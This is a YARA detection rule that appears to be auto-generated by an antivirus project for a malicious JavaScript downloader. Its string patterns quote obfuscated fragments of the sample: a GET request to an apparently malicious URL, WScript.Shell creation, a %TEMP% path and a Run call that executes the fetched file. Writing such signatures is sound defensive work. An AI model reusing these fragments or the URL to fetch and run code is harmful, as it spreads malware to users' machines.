rule sig_20160427_a5de463f83de213ff6453c84180777f2 {
  meta:
    description = "datamaliciousorder - file 20160427_a5de463f83de213ff6453c84180777f2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cf192f6306fe4028b1a58abb048637ba064130865757ff07ed452a67219c0909"

  strings:
    $s1  = "ZxmkwLjufs[ZggsbLjjoj](\"G\" + \"ET\", \"http://onlinecrockpotrecipes.com/k2tspa\", false);" fullword ascii
    $s2  = "function EfpixXmfob() {return KkbddKfajj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"eWlezc5" ascii
    $s3  = "function EfpixXmfob() {return KkbddKfajj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"eWlezc5" ascii
    $s4  = "var KkbddKfajj = function HlrovVsphs() {return YjhxoZqtav[FazesEigrm](\"WScript\"+\".Shell\");}(), TezsyMnlta = 11;" fullword ascii
    $s5  = "function PgyqmZpwzf(RskrjIywcn, SyxycUkyzo){BwdukBitbj = BwdukBitbj * 1; return RskrjIywcn - SyxycUkyzo;};" fullword ascii
    $s6  = "var YjhxoZqtav = this[\"WScript\"];" fullword ascii
    $s7  = "function CydyxJiack(){return WrycnXulfm + \"\";};" fullword ascii
    $s8  = "if (ZxmkwLjufs[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function PoghxJkqbk() {return ((KllbwRcrry == true) && (KllbwRcrry == HgpaiFnxii)) ? 1 : BwdukBitbj;};" fullword ascii
    $s10 = "function BjlsdDvtue()" fullword ascii
    $s11 = "function WyotiJjzex(){return 23;};" fullword ascii
    $s12 = "var NyylwJjkqk = false;" fullword ascii
    $s13 = "return PgyqmZpwzf(RuvahTejny, QfzdpSrmbq);" fullword ascii
    $s14 = "var KllbwRcrry = false;" fullword ascii
    $s15 = "KllbwRcrry = true; " fullword ascii
    $s16 = "function TyyblVfwax(OuiafUjzlo){KkbddKfajj[\"R\"+\"un\"](OuiafUjzlo, BwdukBitbj, BwdukBitbj);};" fullword ascii
    $s17 = "function IequjCwuoh(MudybOuhwr) {var XzgpmIcyqc = (1, 2, 3, 4, 5, MudybOuhwr); return XzgpmIcyqc;};" fullword ascii
    $s18 = "}while (JpbdvUnlno);" fullword ascii
    $s19 = "NyylwJjkqk = true;" fullword ascii
    $s20 = "HgpaiFnxii = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}